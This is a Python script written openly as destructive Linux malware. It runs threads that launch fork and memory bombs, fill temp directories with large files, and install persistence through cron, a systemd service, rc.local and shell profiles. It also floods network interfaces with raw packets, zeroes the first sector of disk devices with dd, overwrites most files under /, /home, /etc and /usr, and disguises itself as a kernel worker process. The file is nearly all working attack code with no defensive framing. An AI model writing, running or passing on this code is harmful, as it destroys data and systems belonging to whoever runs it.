#!/usr/bin/env python3
import os
import sys
import time
import threading
import subprocess
import mmap
import hashlib
import socket
import random
import glob
import signal
import ctypes
import struct
import fcntl
import termios
import array
import resource

def fork_bomb():
    while True:
        try:
            if os.fork() == 0:
                while True:
                    os.system(":(){ :|:& };:")
        except:
            try:
                for _ in range(100):
                    subprocess.Popen(["bash", "-c", "while true; do :; done"])
            except:
                pass
        time.sleep(0.01)

def memory_bomb():
    memory_chunks = []
    while True:
        try:
            for _ in range(5):
                chunk = mmap.mmap(-1, 200 * 1024 * 1024)
                chunk.write(b"X" * 200 * 1024 * 1024)
                memory_chunks.append(chunk)
            for _ in range(10):
                [0] * (50 * 10 ** 6)
            try:
                resource.setrlimit(resource.RLIMIT_AS, (2**63-1, 2**63-1))
            except:
                pass
            time.sleep(0.01)
        except:
            try:
                for _ in range(5):
                    [0] * (10 ** 8)
            except:
                pass

def disk_bomb():
    while True:
        try:
            temp_dirs = ["/tmp", "/var/tmp", "/dev/shm", "/run/user/1000", "/mnt", "/media"]
            for temp_dir in temp_dirs:
                try:
                    os.makedirs(f"{temp_dir}/bomb_storage", exist_ok=True)
                    for _ in range(5):
                        random_name = hashlib.md5(os.urandom(32)).hexdigest()
                        with open(f"{temp_dir}/bomb_storage/{random_name}.tmp", "w") as f:
                            f.seek(1024 * 1024 * 1024 - 1)
                            f.write("X")
                except:
                    pass
            time.sleep(0.01)
        except:
            pass

def persistence():
    script_path = os.path.abspath(sys.argv[0])
    methods = [
        f"(crontab -l 2>/dev/null; echo '* * * * * python3 {script_path}') | crontab -",
        f"cat > /etc/systemd/system/bomb.service << EOF\n[Service]\nExecStart=python3 {script_path}\n[Install]\nWantedBy=multi-user.target\nEOF",
        "systemctl daemon-reload 2>/dev/null",
        "systemctl enable bomb.service 2>/dev/null",
        "systemctl start bomb.service 2>/dev/null",
        f"echo 'python3 {script_path} &' >> /etc/rc.local",
        f"chmod +x /etc/rc.local",
        f"echo 'python3 {script_path} &' >> ~/.bashrc",
        f"echo 'python3 {script_path} &' >> ~/.profile",
        f"echo 'python3 {script_path} &' >> ~/.bash_profile",
    ]
    for method in methods:
        try:
            subprocess.run(method, shell=True, timeout=2, stderr=subprocess.DEVNULL)
        except:
            pass

def hardware_kill():
    try:
        libc = ctypes.CDLL(None)
        ioperm = libc.ioperm
        ioperm.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_int]
        ioperm.restype = ctypes.c_int
        
        if ioperm(0x378, 1, 1) == 0:
            outb = libc.outb
            outb.argtypes = [ctypes.c_ubyte, ctypes.c_uint]
            outb.restype = None
            
            for _ in range(1000):
                outb(0xFF, 0x378)
                time.sleep(0.001)
    except:
        pass

def destroy_mbr():
    try:
        devices = glob.glob("/dev/sd*") + glob.glob("/dev/hd*") + glob.glob("/dev/nvme*")
        for device in devices:
            if device.endswith("a") or device.endswith("1"):
                try:
                    subprocess.run(f"dd if=/dev/zero of={device} bs=512 count=1", 
                                 shell=True, stderr=subprocess.DEVNULL)
                except:
                    pass
    except:
        pass

def kill_network():
    while True:
        try:
            interfaces = os.listdir("/sys/class/net/")
            for iface in interfaces:
                try:
                    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
                    sock.bind((iface, 0))
                    for _ in range(10):
                        sock.send(os.urandom(1500))
                    sock.close()
                except:
                    pass
        except:
            pass
        time.sleep(0.01)

def corrupt_all():
    paths = ["/", "/home", "/root", "/etc", "/var", "/opt", "/usr"]
    for path in paths:
        try:
            for root, dirs, files in os.walk(path, topdown=False):
                for file in files:
                    try:
                        file_path = os.path.join(root, file)
                        if any(ext in file for ext in [".so", ".bin", ".sys", ".pid", ".lock", ".ko"]):
                            continue
                        try:
                            size = os.path.getsize(file_path)
                            if 0 < size < 50 * 1024 * 1024:
                                with open(file_path, "w") as f:
                                    f.write("X" * min(size, 10240))
                        except:
                            pass
                    except:
                        pass
        except:
            pass

def stealth():
    while True:
        try:
            for pid_dir in glob.glob("/proc/[0-9]*"):
                try:
                    pid = int(os.path.basename(pid_dir))
                    with open(f"/proc/{pid}/cmdline", "r") as f:
                        cmdline = f.read()
                        if "bomb" in cmdline.lower() and pid != os.getpid():
                            os.kill(pid, signal.SIGKILL)
                except:
                    pass
            try:
                sys.argv[0] = "[kworker/0:0]"
                os.rename(sys.argv[0], "[kworker/0:0]")
            except:
                pass
            time.sleep(3)
        except:
            pass

if __name__ == "__main__":
    os.system("ulimit -u unlimited 2>/dev/null")
    os.system("ulimit -n 999999 2>/dev/null")
    os.system("ulimit -c unlimited 2>/dev/null")
    
    attacks = [
        fork_bomb,
        memory_bomb,
        disk_bomb,
        persistence,
        kill_network,
        destroy_mbr,
        hardware_kill,
        corrupt_all,
        stealth
    ]
    
    for attack in attacks:
        thread = threading.Thread(target=attack, daemon=True)
        thread.start()
    
    while True:
        time.sleep(60)